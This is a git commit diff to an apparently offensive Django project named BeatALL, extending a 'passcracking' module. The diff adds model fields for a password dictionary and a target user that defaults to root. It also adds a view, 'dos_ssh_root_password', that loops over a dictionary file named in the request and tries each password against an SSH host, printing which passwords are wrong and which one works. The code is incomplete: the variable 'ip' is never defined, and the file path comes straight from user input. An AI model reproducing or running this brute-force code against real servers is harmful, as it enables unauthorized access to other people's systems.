331272e859306e4a88207dcf9330fe5a7dd2534e
zhangyz <zhangyuzeoffice@163.com>
2017-08-11 19:59:59 -0400

    commit

--- BeatALL/passcracking/models.py
+++ BeatALL/passcracking/models.py
@@ -7,8 +7,12 @@ class PasswordCrack(models.Model):
 
 class ssh_crack(models.Model):
     host = models.GenericIPAddressField(verbose_name=u"目标ip地址")
+    dictionary = models.CharField(max_length=32,verbose_name=u"字典名称")
+    user = models.CharField(max_length=32, default="root" ,verbose_name=u"用户")
     name = models.CharField(max_length=32, null=True, blank=True, verbose_name=u"目标命名")
 
+    def __str__(self):
+    	return "<%s>" % self.host
 
 class ssh_crack_detail(models.Model):
     password = models.CharField(max_length=50, verbose_name=u"破解的密码")
--- BeatALL/passcracking/views.py
+++ BeatALL/passcracking/views.py
@@ -1,3 +1,20 @@
 from django.shortcuts import render
+from ssh import ssh_connect
 
 # Create your views here.
+def dos_ssh_root_password(request):
+	if request.method == "POST":
+		print(request.POST)
+		passwdfile = open(request.POST.get("dictionary", ""), 'r')
+		for passwd in passwdfile:
+			ssh_list = [ip, passwd.strip(), request.POST.get("user", "")]
+			ssh_result = ssh_connect(ssh_list)
+			if ssh_result[0] == 0:
+				print('密码: ' + ssh_result[1].strip() + '不正确')
+			else:
+				print('密码: ' + ssh_result[1].strip() + '正确')
+				print(ssh_result[2].strip())
+
+
+
+
